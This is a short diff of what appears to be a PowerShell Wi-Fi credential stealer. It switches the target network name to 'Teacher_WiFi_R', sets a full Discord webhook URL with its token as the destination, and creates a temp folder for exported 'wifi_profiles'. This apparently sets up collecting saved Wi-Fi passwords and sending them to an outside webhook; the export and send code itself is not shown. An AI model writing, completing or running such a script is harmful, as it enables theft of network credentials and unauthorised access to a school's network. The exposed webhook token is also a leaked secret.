@@ -1,4 +1,4 @@
-$target = "netis_mesh_5G"
+$target = "Teacher_WiFi_R"
 $hookUrl = "https://discord.com/api/webhooks/1498815878161236098/c5tRWHMWtTbujvKRdYRCgLuTByoBq_eUDHgUfwW0jyAnY0XHJ0q9nxa7C-eQdSlMPzww"
 $content = 
 $tempDir = Join-Path $env:TEMP ("wifi_profiles_" + [guid]::NewGuid())
